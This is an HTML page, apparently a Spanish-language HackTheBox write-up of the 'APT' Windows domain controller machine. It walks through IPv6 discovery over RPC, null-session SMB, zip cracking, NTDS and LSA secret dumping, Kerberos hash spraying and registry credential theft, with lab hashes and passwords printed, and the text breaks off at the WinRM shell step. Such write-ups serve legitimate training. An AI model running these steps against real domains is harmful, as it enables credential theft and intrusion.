@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox APT</title>
+
+  <meta name="description" content="Resolución de la máquina APT de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox APT">
+  <meta name="twitter:description" content="Resolución de la máquina APT de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="/images/htb/apt.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox APT">
+  <meta property="og:description" content="Resolución de la máquina APT de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/htb/apt.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/htb/apt.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox APT" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#access-henry.vinson">Access - henry.vinson</a></li>
+        <li><a href="#shell-henry.vinson_adm">Shell - henry.vinson_adm</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+        <li><a href="#extra-administrator">Extra - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="/images/htb/apt.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">APT</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos solo 2 puertos abiertos, el <code class="language-plaintext highlighter-rouge">80</code> que es <code class="language-plaintext highlighter-rouge">http</code> y el <code class="language-plaintext highlighter-rouge">135</code> que es <code class="language-plaintext highlighter-rouge">rpc</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.10.213
+Nmap scan report for 10.10.10.213  
+PORT    STATE SERVICE
+80/tcp  open  http
+135/tcp open  msrpc</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En la web principal tenemos una pagina bajo el template de <code class="language-plaintext highlighter-rouge">Gigantic Hosting</code> la cual parece bastante <code class="language-plaintext highlighter-rouge">estatica</code> con solo algunos botones que responden al clic</p>
+<a href="/htb/apt/1.png" target="_blank"><div><p><img src="/htb/apt/1.png"></p></div></a>
+
+<p class="plain-text">Al darle al boton <code class="language-plaintext highlighter-rouge">support</code> nos permite indicar y enviar algunos datos de <code class="language-plaintext highlighter-rouge">contacto</code></p>
+<a href="/htb/apt/2.png" target="_blank"><div><p><img src="/htb/apt/2.png"></p></div></a>
+
+<p class="plain-text">Pero al enviar los datos nos redirige hacia la <code class="language-plaintext highlighter-rouge">10.13.38.16</code> que realmente tiene sentido ya que el template es igual que el del endgame <a href="/endgames/hades">Hades</a> con la misma estetica</p>
+<a href="/htb/apt/3.png" target="_blank"><div><p><img src="/htb/apt/3.png"></p></div></a>
+
+<p class="plain-text">En este <a href="https://www.cyber.airbus.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/">articulo</a> se nos explica una posible forma de enumerar las <code class="language-plaintext highlighter-rouge">interfaces</code> de red a traves de <code class="language-plaintext highlighter-rouge">rpc</code> sin autenticacion usando <code class="language-plaintext highlighter-rouge">ServerAlive2()</code>, nos dan un script que al ejecutarlo nos muestra todas las <code class="language-plaintext highlighter-rouge">interfaces</code> de la máquina, tanto <code class="language-plaintext highlighter-rouge">IPv4</code> como <code class="language-plaintext highlighter-rouge">IPv6</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">IOXIDResolver.py -t 10.10.10.213
+[*] Retrieving network interface of 10.10.10.213  
+Address: apt
+Address: 10.10.10.213
+Address: dead:beef::b885:d62a:d679:573f
+Address: dead:beef::199
+Address: dead:beef::e58d:ef7c:9919:25cc</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al escanear los puertos de la dirección <code class="language-plaintext highlighter-rouge">IPv6</code> de la maquina encontramos abiertos bastantes mas <code class="language-plaintext highlighter-rouge">puertos</code>, entre ellos los clasicos puertos que tendria un <code class="language-plaintext highlighter-rouge">DC</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">-6 dead:beef::b885:d62a:d679:573f
+Nmap scan report for dead:beef::b885:d62a:d679:573f  
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49673/tcp open  unknown
+49688/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Vemos abierto el <code class="language-plaintext highlighter-rouge">445</code> que es smb, con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos enumerar un poco, encontramos que pertenece al dominio <code class="language-plaintext highlighter-rouge">htb.local</code> y el nombre de la maquina <code class="language-plaintext highlighter-rouge">apt</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb dead:beef::b885:d62a:d679:573f
+</span><span class="az">SMB         </span><span class="p">dead:beef::b885:d62a:d679:573f 445    APT              </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para posibles proximos ataques o solo por comodidad agregaremos el <code class="language-plaintext highlighter-rouge">dominio</code> al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> ademas el <code class="language-plaintext highlighter-rouge">nombre</code> de la máquina que es <code class="language-plaintext highlighter-rouge">APT</code> como otro dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"dead:beef::b885:d62a:d679:573f htb.local apt.htb.local"</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="access-henry.vinson">
+<br><h3 class="post-title">Access - henry.vinson</h3><br>
+
+<p class="plain-text">Podemos enumerar los recursos <code class="language-plaintext highlighter-rouge">smb</code> bajo una sesion <code class="language-plaintext highlighter-rouge">nula</code> sin proporcionar usuario ni contraseña, vemos que tenemos privilegio <code class="language-plaintext highlighter-rouge">READ</code> sobre el recurso <code class="language-plaintext highlighter-rouge">backup</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb htb.local -u </span><span class="am">''</span><span class="p"> -p </span><span class="am">''</span><span class="p"> --shares
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="ve">[+] </span><span class="p">htb.local\: 
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">backup          READ            
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">IPC$                            Remote IPC
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">NETLOGON                        Logon server share
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="am">SYSVOL                          Logon server share</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al conectarnos con smbclient solo encontramos un <code class="language-plaintext highlighter-rouge">backup.zip</code> que descargamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">htb.local -no-pass
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Type help for list of commands
+# use backup
+# ls
+drw-rw-rw-          0  Thu Sep 24 02:31:03 2020 .
+drw-rw-rw-          0  Thu Sep 24 02:31:03 2020 ..
+-rw-rw-rw-   10650961  Thu Sep 24 02:31:03 2020 backup.zip  
+# get backup.zip
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si intentamos descomprimir el <code class="language-plaintext highlighter-rouge">zip</code> nos pide una contraseña ya que esta protegido</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ unzip </span><span class="p">backup.zip
+Archive:  backup.zip
+   creating: Active Directory/
+[backup.zip] Active Directory/ntds.dit password:  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">zip2john</code> podemos crear un <code class="language-plaintext highlighter-rouge">hash</code> del zip que podemos crackear con <code class="language-plaintext highlighter-rouge">john</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ zip2john </span><span class="p">backup.zip > hash
+
+</span><span class="ve">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash  
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">iloveyousomuch</span><span class="p">   (</span><span class="am">backup.zip</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al descomprimir el <code class="language-plaintext highlighter-rouge">zip</code> y pasarle la contraseña nos devuelve varios archivos, entre ellos <code class="language-plaintext highlighter-rouge">SYSTEM</code>, <code class="language-plaintext highlighter-rouge">SECURITY</code> y <code class="language-plaintext highlighter-rouge">ntds.dit</code> que almacenan contraseñas y hashes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ unzip </span><span class="p">backup.zip
+Archive:  backup.zip
+   creating: Active Directory/
+[backup.zip] Active Directory/ntds.dit password: iloveyousomuch  
+  inflating: Active Directory/ntds.dit
+  inflating: Active Directory/ntds.jfm
+   creating: registry/
+  inflating: registry/SECURITY
+  inflating: registry/SYSTEM</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si en local dumpeamos los secretos <code class="language-plaintext highlighter-rouge">LSA</code> encontramos una contraseña en texto plano</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-secretsdump </span><span class="p">LOCAL -system registry/SYSTEM -security registry/SECURITY
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0x936ce5da88593206567f650411e1d16b
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:34005b00250066006f0027007a004700600026004200680052003300630050005b002900550032004e00560053005c004c00450059004f002f0026005e0029003c00390078006a0036002500230039005c005c003f0075004a0034005900500062006000440052004b00220020004900450053003200660058004b00220066002c005800280051006c002a0066006700300052006600520071003d0021002c004200650041005600460074005e0045005600520052002d004c0029005600610054006a0076002f005100470039003d006f003b004700400067003e005600610062002d00550059006300200059006400  
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb
+[*] DefaultPassword 
+(Unknown User):Password123!
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x3e0d78cb8f3ed66196584c44b5701501789fc102
+dpapi_userkey:0xdcde3fc585c430a72221a48691fb202218248d46
+[*] NL$KM 
+ 0000   73 4F 34 1D 09 C8 F9 32  23 B9 25 0B DF E2 DC 58   sO4....2#.%....X
+ 0010   44 41 F2 E0 C0 93 CF AD  2F 2E EB 13 81 77 4B 42   DA....../....wKB
+ 0020   C2 E0 6D DE 90 79 44 42  F4 C2 AD 4D 7E 3C 6F B2   ..m..yDB...M~<o.
+ 0030   39 CE 99 95 66 8E AF 7F  1C E0 F6 41 3A 25 DA A8   9...f......A:%..
+NL$KM:734f341d09c8f93223b9250bdfe2dc584441f2e0c093cfad2f2eeb1381774b42c2e06dde90794442f4c2ad4d7e3c6fb239ce9995668eaf7f1ce0f6413a25daa8
+[*] Cleaning up...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tambien tenemos el <code class="language-plaintext highlighter-rouge">ntds.dit</code> que contiene todos loas <code class="language-plaintext highlighter-rouge">hashes</code> de todos los usuarios del dominio los cuales tambien podemos dumpear con <code class="language-plaintext highlighter-rouge">secretsdump</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-secretsdump </span><span class="p">LOCAL -ntds </span><span class="am">'Active Directory/ntds.dit'</span><span class="p"> -system </span><span class="am">'registry/SYSTEM'</span><span class="p">
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0x936ce5da88593206567f650411e1d16b
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 1733ad403c773dde94dddffa2292ffe9
+[*] Reading and decrypting hashes from Active Directory/ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+APT$:1000:aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:72791983d95870c0d6dd999e4389b211:::
+jeb.sloan:3200:aad3b435b51404eeaad3b435b51404ee:9ea25adafeec63e38cef4259d3b15c30:::
+ranson.mejia:3201:aad3b435b51404eeaad3b435b51404ee:3ae49ec5e6fed82ceea0dc2be77750ab:::
+unice.daugherty:3202:aad3b435b51404eeaad3b435b51404ee:531c98e26cfa3caee2174af495031187:::
+kazuo.deleon:3203:aad3b435b51404eeaad3b435b51404ee:fde29e6cb61b4f7fda1ad5cd2759329d:::
+dacy.frederick:3204:aad3b435b51404eeaad3b435b51404ee:51d368765462e9c5aebc456946d8dc86:::
+.........................................................................................  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podriamos probar el hash NT del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> el cual realmente pertenece a la contraseña <code class="language-plaintext highlighter-rouge">Password123!</code> en el lsa no es valida para smb a nivel de dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb htb.local -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="ro">[-] </span><span class="p">htb.local\Administrator:2b576acbe6bcfda7294d6bd18041b8fe STATUS_LOGON_FAILURE</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos iniciar dumpeando todos los <code class="language-plaintext highlighter-rouge">hashes</code> a un txt, filtrando por <code class="language-plaintext highlighter-rouge">:::</code> ya que todos los hashes tendran eso al final, en total conseguimos <code class="language-plaintext highlighter-rouge">2000</code> hashes y usuarios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-secretsdump </span><span class="p">LOCAL -ntds </span><span class="am">'Active Directory/ntds.dit' </span><span class="p">-system </span><span class="am">'registry/SYSTEM' </span><span class="p">| </span><span class="ve">grep</span><span class="p"> ::: > dump.txt  
+
+</span><span class="ve">❯ wc</span><span class="p"> -l dump.txt
+2000 dump.txt</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">awk</code> podemos filtrar por el argumento <code class="language-plaintext highlighter-rouge">1</code> y <code class="language-plaintext highlighter-rouge">4</code> tomando <code class="language-plaintext highlighter-rouge">:</code> como delimitador que pertenecen a los <code class="language-plaintext highlighter-rouge">usuarios</code> y <code class="language-plaintext highlighter-rouge">hashes</code> nt para crear un diccionario para cada uno</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ awk </span><span class="am">'{print $1}' </span><span class="p">FS=</span><span class="am">':' </span><span class="p">dump.txt > users.txt  
+</span><span class="ve">❯ awk </span><span class="am">'{print $4}' </span><span class="p">FS=</span><span class="am">':' </span><span class="p">dump.txt > hashes.txt  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciamos validando los usuarios existentes en el dominio con <code class="language-plaintext highlighter-rouge">kerbrute</code>, ademas de la cuenta de <code class="language-plaintext highlighter-rouge">Administrator</code> y de la maquina <code class="language-plaintext highlighter-rouge">APT$</code> encontramos a <code class="language-plaintext highlighter-rouge">henry.vinson</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ kerbrute </span><span class="p">userenum -d htb.local --dc apt.htb.local users.txt  
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+>  Using KDC(s):
+>  	apt.htb.local:88
+</span><span class="ve">
+>  [+] VALID USERNAME:	 APT$@htb.local
+>  [+] VALID USERNAME:	 Administrator@htb.local
+>  [+] VALID USERNAME:	 henry.vinson@htb.local</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que el hash propio no funciona podriamos probar hacer fuerza bruta con los <code class="language-plaintext highlighter-rouge">2000</code> hashes pero despues de unas cuantas peticiones recibimos un <code class="language-plaintext highlighter-rouge">baneo</code> por ello</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb htb.local -u henry.vinson -H hashes.txt
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="ro">[-] </span><span class="p">htb.local\henry.vinson:2b576acbe6bcfda7294d6bd18041b8fe STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="ro">[-] </span><span class="p">htb.local\henry.vinson:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="ro">[-] </span><span class="p">htb.local\henry.vinson:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="ro">[-] </span><span class="p">Connection Error: The NETBIOS connection with the remote host timed out.
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="ro">[-] </span><span class="p">Connection Error: The NETBIOS connection with the remote host timed out.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En github encontramos un <a href="https://github.com/0xAnomaly/KerbSpray">proyecto</a> el cual nos sirve para haces un <code class="language-plaintext highlighter-rouge">hashspray</code> pero a traves de <code class="language-plaintext highlighter-rouge">kerberos</code> que no tiene la limitacion de peticiones como lo tiene <code class="language-plaintext highlighter-rouge">smb</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">KerbSpray.py htb.local henry.vinson apt.htb.local hashes.txt  
+[*] Spraying Hashes...
+
+[i] Domain:             htb.local
+[i] Target User:        henry.vinson
+[i] Domain Controller:  apt.htb.local
+[+] Success htb.local/henry.vinson
+[+] Hash Found: e53d87d42adaa3ca32bdb34a876cbffb</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de un rato encontramos su <code class="language-plaintext highlighter-rouge">hash</code> NT que comprobamos con <code class="language-plaintext highlighter-rouge">crackmapexec</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb htb.local -u henry.vinson -H e53d87d42adaa3ca32bdb34a876cbffb
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="ve">[+] </span><span class="p">htb.local\henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-henry.vinson_adm">
+<br><h3 class="post-title">Shell - henry.vinson_adm</h3><br>
+
+<p class="plain-text">En este caso desde este usuario podemos acceder a los registros <code class="language-plaintext highlighter-rouge">HKEY_USERS</code> o <code class="language-plaintext highlighter-rouge">HKU</code> a traves de <code class="language-plaintext highlighter-rouge">reg</code>, donde encontramos varias subkeys entre ellas <code class="language-plaintext highlighter-rouge">Software</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-reg </span><span class="p">htb.local/henry.vinson@apt.htb.local -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKU  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[!] Cannot check RemoteRegistry status. Hoping it is started...
+HKU
+HKU\Console
+HKU\Control Panel
+HKU\Environment
+HKU\Keyboard Layout
+HKU\Network
+HKU\Software
+HKU\System
+HKU\Volatile Environment</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Bajo la subkey <code class="language-plaintext highlighter-rouge">Software</code> encontramos una bastante fuera de lo comun que es <code class="language-plaintext highlighter-rouge">GiganticHostingManagementSystem</code> en la cual podria haber cosas interesantes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-reg </span><span class="p">htb.local/henry.vinson@apt.htb.local -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName </span><span class="am">'HKU\Software'</span><span class="p">  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[!] Cannot check RemoteRegistry status. Hoping it is started...
+HKU\Software
+HKU\Software\GiganticHostingManagementSystem
+HKU\Software\Microsoft
+HKU\Software\Policies
+HKU\Software\RegisteredApplications
+HKU\Software\Sysinternals
+HKU\Software\VMware, Inc.
+HKU\Software\Wow6432Node
+HKU\Software\Classes</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacer una consulta con <code class="language-plaintext highlighter-rouge">reg</code> encontramos unas <code class="language-plaintext highlighter-rouge">credenciales</code> en texto plano</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-reg </span><span class="p">htb.local/henry.vinson@apt.htb.local -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName </span><span class="am">'HKU\Software\GiganticHostingManagementSystem'  </span><span class="p">
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[!] Cannot check RemoteRegistry status. Hoping it is started...
+HKU\Software\GiganticHostingManagementSystem
+	UserName	REG_SZ	 henry.vinson_adm
+	PassWord	REG_SZ	 G1#Ny5@2dvht</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos comprobar las credenciales de <code class="language-plaintext highlighter-rouge">henry.vinson_adm</code> con <code class="language-plaintext highlighter-rouge">crackmapexec</code>, esta contraseña no es valida solo para el servicio <code class="language-plaintext highlighter-rouge">smb</code> sino tambien para <code class="language-plaintext highlighter-rouge">winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb htb.local -u henry.vinson_adm -p G1#Ny5@2dvht
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">htb.local       445    APT              </span><span class="ve">[+] </span><span class="p">htb.local\henry.vinson_adm:G1#Ny5@2dvht 
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">winrm htb.local -u henry.vinson_adm -p G1#Ny5@2dvht
+</span><span class="az">SMB         </span><span class="p">htb.local       5985   APT              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 14393 (name:APT) (domain:htb.local)
+</span><span class="az">HTTP        </span><span class="p">htb.local       5985   APT              </span><span class="az">[*] </span><span class="p">http://htb.local:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">htb.local       5985   APT              </span><span class="ve">[+] </span><span class="p">htb.local\henry.vinson_adm:G1#Ny5@2dvht </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Simplemente nos conectamos como <code class="language-plaintext highlighter-rouge">evil-winrm</code> y obtenemos una <code class="language-plaintext highlighter-rouge">powershell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
